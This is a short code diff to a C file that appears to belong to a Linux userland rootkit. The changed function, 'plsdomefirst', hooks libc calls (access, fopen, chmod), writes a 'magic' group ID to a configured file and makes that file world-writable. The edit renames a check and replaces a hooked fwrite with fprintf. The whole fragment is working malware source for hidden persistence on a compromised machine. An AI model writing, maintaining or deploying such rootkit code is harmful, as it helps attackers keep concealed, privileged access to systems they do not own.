@@ -61,17 +61,15 @@ void plsdomefirst(void);
 #include "includes.h"
 
 void plsdomefirst(void){
-    if(not_user(0) || rknomore())
+    if(notuser(0) || rknomore())
         return;
 
 #ifdef READ_GID_FROM_FILE
-    hook(CACCESS,CFOPEN,CFWRITE,CCHMOD);
+    hook(CACCESS,CFOPEN,CCHMOD);
     if((long)call(CACCESS, GID_PATH, F_OK) != 0){
         FILE *fp = call(CFOPEN, GID_PATH, "w");
         if(fp != NULL){
-            char buf[12];
-            snprintf(buf, 12, "%d", MAGIC_GID);
-            call(CFWRITE, buf, 1, strlen(buf), fp);
+            fprintf(fp, "%u", (gid_t)MAGIC_GID);
             fclose(fp);
             call(CCHMOD, GID_PATH, 0666);
         }
